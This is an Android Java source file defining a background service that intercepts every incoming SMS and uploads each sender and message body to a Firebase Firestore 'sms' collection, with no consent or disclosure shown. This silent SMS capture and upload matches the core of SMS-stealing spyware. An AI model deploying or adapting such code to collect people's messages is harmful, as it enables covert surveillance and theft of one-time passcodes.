package com.example.zvonochnaya;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

public class SmsService extends Service {
    private SmsReceiver smsReceiver;
    private FirebaseFirestore db;

    @Override
    public void onCreate() {
        super.onCreate();
        db = FirebaseFirestore.getInstance();
        smsReceiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        registerReceiver(smsReceiver, filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(smsReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private class SmsReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            System.out.println(2);
            if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                    for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String message = smsMessage.getMessageBody();
                        saveSmsToFirebase(sender, message);
                    }
                }
            }
        }

        private void saveSmsToFirebase(String sender, String message) {
            System.out.println(3);

            Map<String, Object> smsData = new HashMap<>();
            smsData.put("sender", sender);
            smsData.put("message", message);

            db.collection("sms").add(smsData)
                    .addOnSuccessListener(documentReference -> {
                        // SMS saved successfully
                    })
                    .addOnFailureListener(e -> {
                        // Error occurred while saving SMS
                    });
        }
    }
}

